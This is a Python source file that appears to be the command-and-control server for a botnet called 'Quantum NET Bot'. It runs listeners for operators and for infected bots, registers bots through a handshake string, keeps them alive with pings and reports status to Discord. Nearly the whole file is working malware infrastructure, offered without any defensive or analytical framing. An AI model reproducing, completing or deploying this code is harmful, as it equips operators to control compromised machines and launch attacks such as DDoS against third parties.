#
# @title: Quantum NET Bot
# @since: 5/18/21
# @creator: Quantum Security Team (vl0b, Exo, clever, Max, Beta)
#

# Modules
import socket, sys, os, requests, time, threading, random, datetime, subprocess

# Files
from assets.cnc_controlpanel.main import *
from assets.Config.main import *
from assets.utils.CLI import *
from assets.Logger.discord import *
from assets.utils.CLI import *

from assets.Commands.main_screen import *
from assets.Commands.command_handler import *



buffer_length = 1024
host = "0.0.0.0"
port = 422
bot_port = 446
bots = [ ]

cp_hostname = "\rQuantum >>: "


print(f"Wocky Successfully started! | Cnc Port: {port} | Cnc Port: {bot_port}\r\n")
Discord.send_news(f"Wocky NET Successsfully started!\r\n```Port {port}```")

def handle_connection(client, addr):
        # try:
        CLI_Control.set_TerminalSize(client, 40, 79)
        CLI_Control.set_Title(client, "Welcome to Society NET!")
        MainScreen(client, addr)
        while(True):
                CMDHandler(client, addr)
        # except:
        #         print("User disconnected")

""" 
The whole bot function was coded all here for testing reasons!
"""

def bot_handle(client, addr):
        msg_c = 0 # variable to count empty messages (disconnect detection)
        buff = client.recv(1024).decode().strip().replace("\r\n", "")
        """
        Receiving a certain characters in the buffer in order to connect or it disconnect the socket
        """
        if "[quantum_connect]," in buff:
                ServerConfig.bots.append([client, buff.replace(",","\r\n"), addr[0], addr[1]]) # Adding bot to bot list
                bot_c = threading.active_count() - 2 # Bot count
                client.send("ping".encode()) # send the first ping for the bot to read and send back
                print(f"New BOT Connected! | Bot Count: {bot_c} | {addr[0]} | {addr[1]}\r\n{cp_hostname}")
        else:
                client.close() # socket close if the correct data wasn't received!

        # socket connected successfully
        # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        while(True):
                bot_c = threading.active_count() - 2 # Bot count minus 2 due to starting cnc and listener threads
                msgc = str(msg_c) # Converting empty message variable 'msg_c' to string
                data = client.recv(1024).decode().strip().replace("\r\n", "") # Constantly receive new data

                """
                Disconnect detection

                The socket gets stuck in this while loop when user disconnects or times out so i made a
                empty line counter, counting upto 10 empty line for the socket to close. the socket should 
                be sending 'ping' data back and forth to the server to make sure to connected!
                """
                if data == "":
                        if msg_c > 10:
                                client.close()
                                print("Bot disconnected")
                                # ServerConfig.bots.delete
                                sys.exit()
                        msg_c+=1
                else:
                        msg_c = 0

                if data == "ping":
                    client.send("ping".encode())
                    time.sleep(1)

def listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Try To Reuse Port Bypass TIME_WAIT Sometimes
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen()
        while True:
                client, address = sock.accept()
                try:
                        threading.Thread(target=handle_connection, args=(client, address)).start()
                except:
                        print("Client Disconnected!")
                active_connections = threading.active_count()
                print(f"TCP Connection From {address[0]} : {str(address[1])} | {active_connections}")

def bot_listen():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Try To Reuse Port Bypass TIME_WAIT Sometimes
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, bot_port))
        sock.listen()
        while True:
                client, address = sock.accept()
                try:
                        threading.Thread(target=bot_handle, args=(client, address)).start()
                except:
                        print("Client Disconnected!")
                print(f"-TCP Connection From {address[0]} : {str(address[1])}")




threading.Thread(target=listener).start()
threading.Thread(target=bot_listen).start()
CP()